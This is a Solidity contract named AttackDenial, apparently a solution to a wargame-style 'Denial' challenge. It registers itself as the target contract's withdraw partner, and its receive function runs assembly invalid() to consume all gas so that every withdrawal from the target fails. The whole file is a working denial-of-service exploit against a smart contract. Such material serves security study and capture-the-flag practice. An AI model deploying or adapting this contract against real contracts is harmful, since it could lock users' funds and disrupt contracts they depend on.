// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'contracts/denial.sol';

contract AttackDenial {
    
    address public owner;
    constructor(Denial target) {
        target.setWithdrawPartner(address(this));
    }
    // receive vs fallback
    // ether vs data  + ether
    receive() external payable{
        // revert()
        // Consume all the gas to fail transaction
        assembly{
            invalid()
        }
    }
}